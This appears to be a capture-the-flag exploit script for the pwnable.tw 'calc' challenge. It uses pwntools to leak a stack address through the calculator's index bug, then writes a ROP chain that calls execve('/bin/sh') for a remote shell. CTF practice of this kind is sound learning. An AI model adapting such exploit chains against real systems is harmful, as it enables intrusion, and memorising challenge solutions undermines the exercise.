# Gnas
from pwn import *
from ctypes import c_int32

def my_format(offset, old, new):
	result = b"+"
	result += str(offset).encode()
	if old < new:
		result += b"+"
	else:
		result += b"-"
	result += str(abs(new-old)).encode()
	return result, abs(new-old)


#p = process("./calc")
p = remote("chall.pwnable.tw",10100)


#gdb.attach(p, gdbscript='''
#	b *0x080494A6
#	c
#	''')
#input()


p.recvline()

## Stage 1: Leak stack
# offset = (0xffffcbb8-0xffffc618)/4 = 360

p.sendline(b"+360")
offset_368 = c_int32(int(p.recvline()[:-1])).value
print("offset_368 = ", hex(offset_368 & (2**32-1)))

offset_403 = offset_368 + (403-368)*4
offset_405 = offset_403 + 2*4

pop_eax_ret = 0x0805c34b #(Set to 11)
pop_ecx_ebx_ret = 0x080701d1 #(point to binsh)
pop_edx_ret = 0x080701aa #(set to 0)
int_80h = 0x08049a21




## Stage 2: ROP
payload, old = my_format(369, 0x0804967a, pop_eax_ret)
p.sendline(payload)


payload, old = my_format(370, old, 11)
p.sendline(payload)

payload, old = my_format(371, old, pop_ecx_ebx_ret)
p.sendline(payload)

payload, old = my_format(372, old, 0)
p.sendline(payload)

payload, old = my_format(373, old, offset_368+4*9)
p.sendline(payload)


payload, old = my_format(374, old, pop_edx_ret)
p.sendline(payload)

payload, old = my_format(375, old, 0)
p.sendline(payload)

payload, old = my_format(376, old, int_80h)
p.sendline(payload)


payload, old = my_format(377, old, u32(b"/bin"))
p.sendline(payload)

payload, old = my_format(378, old, u32(b"/sh\x00"))
p.sendline(payload)

p.interactive()
